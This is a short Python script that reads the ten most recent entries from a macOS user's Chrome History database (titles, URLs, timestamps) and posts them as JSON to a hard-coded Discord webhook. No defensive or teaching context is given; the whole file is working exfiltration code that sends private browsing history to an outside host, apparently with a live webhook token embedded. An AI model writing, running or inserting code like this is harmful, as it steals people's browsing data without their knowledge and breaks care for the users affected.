import sqlite3
import requests
import json

# Connect to the Chrome history database
connection = sqlite3.connect('/Users/yourusername/Library/Application Support/Google/Chrome/Default/History')
cursor = connection.cursor()

# Execute a SELECT statement to retrieve the browsing history
select_statement = "SELECT title, url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10"
cursor.execute(select_statement)
results = cursor.fetchall()

# Format the history data as a list of dictionaries
history = []
for row in results:
    title, url, timestamp = row
    history.append({
        'title': title,
        'url': url,
        'timestamp': timestamp
    })

# Convert the history data to a JSON payload
payload = {
    'content': 'Here is the latest browsing history:',
    'embeds': [
        {
            'title': 'Latest Chrome History',
            'description': json.dumps(history, indent=2)
        }
    ]
}

# Send the payload to the Discord webhook
response = requests.post('https://discord.com/api/webhooks/1089245450760097995/1sH24u4b4epfXkh3goi45cH4CFOhoz6bvkHROD5y75gcHYkmg3madp9FcQyY7FHGEhHx', json=payload)

# Print the response from the webhook server
print(response.content)
